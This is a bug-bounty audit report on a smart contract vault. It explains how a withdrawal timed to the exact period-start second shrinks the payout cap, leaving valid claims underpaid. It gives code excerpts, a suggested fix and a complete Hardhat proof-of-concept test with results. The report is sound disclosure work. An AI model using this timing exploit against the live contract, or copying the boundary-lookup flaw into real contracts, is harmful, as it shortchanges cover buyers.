# 89401 sc high withdrawal requested at the exact period start second lowers the payout cap but stays payable so valid claims are underpaid

**Submitted on Aug 19th 2026 at 03:05:55 UTC by @Pelican29685 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89401
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

`payout()` checks two things. First, how much the vault can actually pay now: the assets left in the vault, plus the assets waiting to be withdrawn. Second, a cap: how much was in the vault at the start of the period. It pays the smaller of the two.

If you request withdrawal at the exact period start time, the money goes into the assets waiting to be withdrawn, but it is subtracted from the cap at the period start. So claims are underpaid.

## How I got here

I first tried flash loan deposit and withdraw inside one block. But it did not work. Because withdrawal is delayed in a later period. While reading that code I noticed period number and timestamp. The withdrawal uses the period number, but the asset log uses the timestamp. It's the same thing, but it uses two different units.

## Vulnerability Details

Two different units are used for the same event.

```solidity
// FirelightVault.sol, _requestWithdraw, L1008 - the bucket is chosen by period number
uint256 period = currentPeriod() + 1;

// FirelightVault.sol, _logTrace, L1055 - the checkpoint is written by timestamp
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

At the exact period start, `currentPeriod()` is already P. So the bucket is P+1. Then `payout()` reads that bucket (P+1) so the money is payable.

At the same moment, the key is exactly `periodStart(P)`. `TotalAssetsAt` uses `upperLookupRecent` that key takes the newest one less than or equal to `periodStart`. So it picks the value after the withdrawal (A - W). So one second later the key is `periodStart + 1`, so it skips it and the cap stays at A.

The code has a comment at L918-920. It says we need to stop people from escaping with withdrawals. This proves they tried to make a safety guard, not a bug. The safety guard worked only halfway. `_requestWithdraw` put the money in the payable bucket. That part was right. But the cap calculation did not change. So, in the same function, the results of the two calculations disagree.

## Impact Details

```
paidAmount = min(amount, min(assetsAtCapturePeriod, activePayableAmount))
           = min(amount, min(A - W, A))
           = A - W
```

When the payout is less, that money just stays there. That is a calculation problem, not a liquidity problem. The shortfall stays in the vault. The cover buyer does not receive it. This attack does not need special power or money. An LP can trigger this when the withdrawal is included exactly at the period boundary. If multiple withdrawals are included at the same boundary timestamp, the reduction would accumulate across those withdrawals.

## What I did not verify

The PoC forced the exact second. I did not measure how often a block timestamp actually lands on `periodStart` on mainnet.

## Suggested fix

Reading the cap as `totalAssetsAt(capturePeriodStart - 1)` would stop a checkpoint written on the boundary second from lowering it. This looks like the smallest change.

***

I used Claude Code to help explore the codebase and build the PoC. The analysis and this writeup are mine.

## Proof of Concept

## Steps to run

1. Clone the in-scope repo and check out the audit branch: `git clone https://github.com/immunefi-team/audit-comp-firelight && cd audit-comp-firelight && git checkout v1_audit_ready`
2. `npm install`
3. Save the file below as `test/poc_exposure_cap_boundary.js`
4. `npx hardhat test test/poc_exposure_cap_boundary.js`

Uses the repo's own fixture (`test/setup/fixtures.js`), default config: 6 decimals, period duration 604800 (1 week).

## What the test does

Two runs that are identical except for a one second shift of the withdrawal request.

1. A user deposits `A = 10,000`.
2. `periodStart` is read as `currentPeriodEnd()`, the start of the next period. This is the capture period we pay out for.
3. `setNextBlockTimestamp(periodStart + offset)` places the withdrawal request of `W = 4,000` either exactly on the boundary (`offset = 0`) or one second later (`offset = 1`).
4. `payout(receiver, A * 10, periodStart)` asks for far more than the vault holds, so the paid amount is bound purely by the caps.
5. The test measures the receiver's token balance delta.

## Result

| withdrawal at   | withdrawAssets\[P+1] | totalAssets() | totalAssetsAt(periodStart) | paid   |
| --------------- | -------------------- | ------------- | -------------------------- | ------ |
| periodStart + 1 | 4,000                | 6,000         | 10,000                     | 10,000 |
| periodStart     | 4,000                | 6,000         | 6,000                      | 6,000  |

Only the cap differs. The payable pool is 10,000 in both runs.

```
  PoC: period-start withdrawal deflates the payout exposure cap
    checked: withdrawal one second AFTER the boundary -> full payable amount is paid
    checked: withdrawal EXACTLY ON the boundary -> payout is capped at A - W
    checked: the two runs differ by exactly the withdrawn amount

  3 passing
```

The third test asserts `late.paid - boundary.paid == W` and also `boundary.activeAssets + boundary.bucket == A`. The shortfall is not caused by insufficient assets. In both runs, activeAssets + bucket == A.

## Test file

```javascript
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { deployVault } = require("./setup/fixtures.js");
const { expect } = require("chai");

const DEPOSIT = 10_000_000_000n; // 10,000 tokens (6 decimals)
const WITHDRAW = 4_000_000_000n; //  4,000 tokens -> a 40% LP

// Runs the whole flow with the withdrawal request placed at `periodStart + offset`.
async function runPayout(offset) {
  const ctx = await loadFixture(deployVault);
  const { firelight_vault, token_contract, payout_signer, payout_receiver, users, utils } = ctx;

  const user = users[0];
  await utils.mintAndApprove(DEPOSIT, user);
  await firelight_vault.connect(user).deposit(DEPOSIT, user.address);

  const periodStart = await firelight_vault.currentPeriodEnd();

  await time.setNextBlockTimestamp(periodStart + offset);
  await firelight_vault.connect(user).withdraw(WITHDRAW, user.address, user.address);

  const capturePeriod = await firelight_vault.currentPeriod();

  const bucket = await firelight_vault.withdrawAssets(capturePeriod + 1n);
  const activeAssets = await firelight_vault.totalAssets();
  const cap = await firelight_vault.totalAssetsAt(periodStart);

  const before = await token_contract.balanceOf(payout_receiver.address);
  await firelight_vault.connect(payout_signer).payout(payout_receiver.address, DEPOSIT * 10n, periodStart);
  const paid = (await token_contract.balanceOf(payout_receiver.address)) - before;

  return { bucket, activeAssets, cap, paid, capturePeriod, periodStart };
}

describe("PoC: period-start withdrawal deflates the payout exposure cap", function () {
  it("withdrawal one second AFTER the boundary -> full payable amount is paid", async () => {
    const r = await runPayout(1n);

    expect(r.bucket).to.equal(WITHDRAW);
    expect(r.activeAssets).to.equal(DEPOSIT - WITHDRAW);
    expect(r.cap).to.equal(DEPOSIT);
    expect(r.paid).to.equal(DEPOSIT);
  });

  it("withdrawal EXACTLY ON the boundary -> payout is capped at A - W", async () => {
    const r = await runPayout(0n);

    expect(r.bucket).to.equal(WITHDRAW);
    expect(r.activeAssets).to.equal(DEPOSIT - WITHDRAW);
    expect(r.cap).to.equal(DEPOSIT - WITHDRAW);
    expect(r.paid).to.equal(DEPOSIT - WITHDRAW);
  });

  it("the two runs differ by exactly the withdrawn amount", async () => {
    const late = await runPayout(1n);
    const boundary = await runPayout(0n);

    expect(late.paid - boundary.paid).to.equal(WITHDRAW);
    expect(boundary.activeAssets + boundary.bucket).to.equal(DEPOSIT);
  });
});
```
